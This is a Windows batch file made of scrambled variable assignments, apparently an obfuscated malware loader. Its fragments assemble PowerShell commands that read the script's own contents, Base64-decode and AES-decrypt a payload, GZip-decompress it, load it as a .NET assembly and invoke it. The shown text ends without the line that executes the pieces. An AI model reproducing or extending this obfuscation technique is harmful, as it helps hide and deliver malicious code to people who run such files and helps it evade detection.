@echo off
set "xbMvSVgZnk=em"
set "oKZvcyTzZX=32"
set "RarxjNBiPJ=Wi"
set "XHhUmbBWyp=\v"
set "EpCjmLsKab=nd"
set "PRFxUQIyxk=ll"
set "AwFrByZOUv=co"
set "UBPhbWpAvt=ow"
set "CCFHuazAnf=Po"
set "TvetDeCUAG=we"
set "LnOeLxBbhj= /"
set "QIjCVbxHLE=s\"
set "YKpLXosYcE=1."
set "LfyyqpUCOs=0\"
set "tzHACrbpHd=:\"
set "MabiULiyBN=.e"
set "gZhfTutogw=he"
set "gAaJjecOlC=rS"
set "iBmdKvrCJC=he"
set "wLkxnFPiat=ws"
set "XXkdDosTDK=do"
set "ZRlEuztDtG=\W"
set "UaitLpaeUm=ll"
set "QnlyhXJnxm=in"
set "bOeVrAExYN= C"
set "ReNrkgXZkh=y "
set "ZroGjpkkvn=st"
set "YvIpidWyoR=Sy"
set "vXaYLSXRGM=py"
set "vEraFAtsQI=po"
set "yKvSzSjIDX=rs"
set "rLOSBUnYAj=xe"
set "PFcMacHhag=we"
set "omMKYRYUkY=cd"
set "XZkgNUFWBX= %~dp0"
set "tJSNZOwSjc=bWAc"
set "NsAzHxgiXT=]::N"
set "WBkTFtRfZe=ateD"
set "daCplLlTeR=dAPb"
set "iEEhcToTrA=yste"
set "ijdOGVcvJF=and "
set "eyaNCVRiVE=ew-O"
set "mYsBLIXhTF=1..-"
set "biRrrMbHPS= [Sy"
set "SHlutkQbjH=raph"
set "tsHRuBvmhy=::('"
set "eCXUfvVGIW=Comp"
set "HkeMAKTZiH=ress"
set "EyXwmCtxEw=stem"
set "UoDIqgckMS=('Tg"
set "fEDGfdTzLA=ring"
set "LikAvjdWpQ=iron"
set "QZxmRMioxP=$NHG"
set "zxjylXbgVu=)($z"
set "wJfqhsLBbn=SF.D"
set "syiRlbDrXf=('%~f0'"
set "lAauXuPjLv=.Cre"
set "wEXTuuQtMq=l5E7"
set "mOzBkYVHKF=[-1."
set "zlzzFzqUBL= if "
set "CZkSeEGdZT=c.Pa"
set "gTemHOdUkh=.Mem"
set "yyDnciUsSk=y.Ci"
set "LOLemOEyQl=rtS4"
set "gXAapiQccP=m.Re"
set "ivvLLkVaXB=ddin"
set "zXFXUSRfgD=-joi"
set "TFSGcbLucY=n ''"
set "RGRLuDhnpF=ect "
set "cxiqhPlMpo=();$"
set "DItnYEBICf=mory"
set "bosEqRxPGy=iVn."
set "rDuHoAzISI=TllA"
set "ryWYkJjrxm=jC);"
set "sCjmagaQPz=B.En"
set "GHUfTgjCUv=d;$Q"
set "dwQyWcOJWG=.Cry"
set "sagAHWdIwo=eam("
set "cGzLpWzbzS=1] -"
set "ZvzdfzDhKX=6] -"
set "xEhETrJkyP=ptog"
set "qlqQGeXzBp=;$cK"
set "exHTMYqCxt=t Sy"
set "hxATEUNBXE= [st"
set "ZyUatzaNdC=stem"
set "sGcVgCcIhn=EaiD"
set "GPlFuIUUoa='0Pg"
set "xOpTocWahw=.Com"
set "mpTknxwzxj=($dA"
set "rCtYjwGbqh=esaB"
set "USEafkiCAa=QbWA"
set "NSKITrPXXM=..-1"
set "AqsGJHccpx=, $z"
set "jhqxFuUPYJ=Comp"
set "goxbCkTWyG=-joi"
set "SzZoWNLhKd=Star"
set "LQOdOhktjK=.GZi"
set "rzRAUTvOCg=;$cK"
set "PKhgPurOAo=.Sec"
set "tbsQRWvxmh=.IO."
set "mUSCtlxwHS=comm"
set "QTLtxXsaFq=raph"
set "omyZVwXmxR=BHDO"
set "xrWdwlROdx=ecry"
set "xqVabyVHYO=ne);"
set "ZcrwTHWyfx=:: '"
set "MqCDAiXQYI=);$Q"
set "QZfOrXArZB=YokW"
set "QrzwGOnwDV=d = "
set "FdKrAYjhTE=106u"
set "FoKByzcxJq=y.Cr"
set "AFunvPgnTT=YAp "
set "kIywZdvzUF=).Sp"
set "whYdbigDwG=$QOm"
set "GWPaTIpqpi=gAB "
set "rAugrMRZgN=; };"
set "lnIVsYsIkn=ress"
set "DgjxzddbMi= [Sy"
set "OoSKJYbQkw=Conv"
set "CCoSrgxzMJ='[-1"
set "omUheKKroA=tS46"
set "PysChxgzkz=[Sys"
set "ajwhkcOdMT===')"
set "UxqWjSXkat=$NHG"
set "FafvJQVnyN=6esa"
set "MiThXlWcta=am;$"
set "HABKcozeIR=zHhH"
set "pTtjVxylIh=Ac.I"
set "CagnhuVclR=D = "
set "fLvDuOpfsQ=3); "
set "DiBZZTHpaP=Bmor"
set "leXhqwENxu=-nop"
set "wfoiELyAQi=:('g"
set "oXulRBHGDx== $Q"
set "OBybemuvbP=gjYA"
set "RKkMYcfieQ= = $"
set "xTkxHyPpJF=lBlo"
set "wrrodlbVCj=BC;$"
set "TkGVtUjaRR=KCgA"
set "gElqerjKUV=le  "
set "twZPcMsNmB=.Ass"
set "IcWlUPBEjZ=gsYZ"
set "CYrnhrCfum=Disp"
set "NKuAmhfZJR=.Mod"
set "jSuoRjaCKx=YxVw"
set "RIrrVAnkRy=lit("
set "EKiDPdMYoF=)) {"
set "QBVIXOQReC=$zEa"
set "nzASavPlpM=New-"
set "oSiQWupAer=ypto"
set "syAwGOaShs=oryS"
set "USNlxyyqHw=pose"
set "kFGuPnTJEb=pStr"
set "AIQnBWidxS=Invo"
set "EyieVQxbNH=brea"
set "XuQtjFjGYM=New-"
set "JyxsxmzOfQ=$QbW"
set "THmDRaDAer=s75K"
set "tWWouZulyf=tsWi"
set "amOFBysYxu=uE ="
set "CykiURhmjB=Pbz "
set "UpAUHpdfER=[Sys"
set "DPJMwhiHFp=morF"
set "ADjYFDntJn=comp"
set "zoQyrboHRg=  $j"
set "cNYYJCqAMv=in $"
set "xRRDrYwNBd=$cKY"
set "xQwVEGmUWr=Fina"
set "eXphbsVefv=ddin"
set "NoxMwGScKf=bWAc"
set "JkPeRhlSOq=pres"
set "njGKFZroqI=.Con"
set "MyUiBseVaR=();$"
set "diwoLLpwPW=F = "
set "BnpbMcGVhZ=Mode"
set "GPNuFgnFRb=ck($"
set "hWOlqQWcSN=Ap.T"
set "iLnbYSgTNF=CFxo"
set "MAKHxZwhqg=sion"
set "OUmZdrEzvN=YokW"
set "fUuaaaQazv='txe"
set "gdFhhLwCUV=PTtG"
set "FPJaLSvMpJ=$BHD"
set "jMmmuQXUdT=L4Yi"
set "IvhiWdKjhy=F'[-"
set "fMDpOLJowR=[IO."
set "qqtpgIsFrB=.Dis"
set "WSJdfhTqSj=Od, "
set "nqoKrVdLjQ=m.IO"
set "HBcjOSSvDE=grap"
set "AnpgMcbHDZ=rofi"
set "bSrqmyiMct=ispo"
set "dWfbAcHHCt= = $"
set "HJwYyBkQHN=O.Me"
set "FBfKoQeUUk=::De"
set "jBtINKRWpK=ode]"
set "uGTWOrMKKl=ionM"
set "ZFTosGxPlJ=gnir"
set "NuNnmbYTib=oin "
set "OQKfQgGqIC= = N"
set "LdNOAIsAyA=PxEW"
set "ztvTPlKFJu=D = "
set "akTcgUQQdp=Secu"
set "qrjgQJQGfJ=iD ="
set "VAvuqwvcms=)($j"
set "jOyIZwKuMz=-1.."
set "DdYpDESjdl=File"
set "BiKhXIbpAV=oArr"
set "YCAeWtkYyf=-Obj"
set "xbJitpFblq=form"
set "bHFVdKcTDo=rity"
set "bnUkAMnbBJ=7;$Q"
set "kUQCqtCgXn=zEai"
set "fBVkvoBbSK=);$N"
set "MbWYWZszBF=ert]"
set "FgdWYwSTfx= = ["
set "QJqoyjLwaZ=gMod"
set "ymaeWDnLes=16] "
set "VSldpUfIJS=se()"
set "xIOviESVQt=m.IO"
set "iLxHhaAxSh=V = "
set "ZtAcLDybbm=Disp"
set "spGZIJxjzx=z.Su"
set "PJLBPHTtDp=ptog"
set "SNpVEpBXLS=;$Ch"
set "HsrJSWnuSL=tem."
set "xMBpzfBFYM=[Env"
set "exRgSppfJT=HGjC"
set "HfHRUnUdiQ=QOmS"
set "YhpGpARcGZ= '')"
set "xxnbcvwskE=.Cop"
set "nXVdCrSDjp=embl"
set "ceLLaPtEbT=$NHG"
set "iRnHwuyhHc=eMVs"
set "fhaDpYbTCK=]::C"
set "tGfxcNsXOs=ing("
set "CCnFJIxoJi=[Sys"
set "jYcBTMsHah=rans"
set "HkCzLELFwl=ct S"
set "hcBbrLWJST= New"
set "oiFZZSGmNQ=Secu"
set "bKsXfnCZxe=g = "
set "gxEDpTDXYL=zEai"
set "txPrCadPPX=null"
set "ToOFkYCEHM=bWAc"
set "MGqkAJbVED=tem."
set "VFnavOWqGA=zEai"
set "MQkrxPYQUL=th('"
set "xhIGVAaGIq=hy.A"
set "VAnxNhFOQy=yste"
set "ocwhLVyaCm=$zEa"
set "ZlGqCKRyZB=Btgu"
set "SwntmRwjNq=]::("
set "aSPyWwQRCm=ose("
set "GHTRQwBeOA=;$KC"
set "RdXGgxmUeW=..-1"
set "wZRUrKgQWL=ment"
set "ugfGyzJhcb=oL'["
set "gQsblooJkB=stem"
set "IQhuxHsGRR=;$BH"
set "KNdGkltLJX=e]::"
set "vqOrsgKwJP=.-16"
set "EfOJdtumWP=nirt"
set "JcSrepFNQI=jC.T"
set "BxjGxZpiLz=S46e"
set "pMqGlTDEse=PKCS"
set "CwVOxLkjWV=k; }"
set "QjdcvjRVYl=('da"
set "YWmMtDgywK=dj0C"
set "LcnQzjWbtI=, (,"
set "CcMYYOoAGd=join"
set "XAApwnGIOR=m(, "
set "HzpByroBgV=Obje"
set "rqcJWelAMF=nage"
set "fLfZAFPZor=n ''"
set "zbNQpUuBjE=tryP"
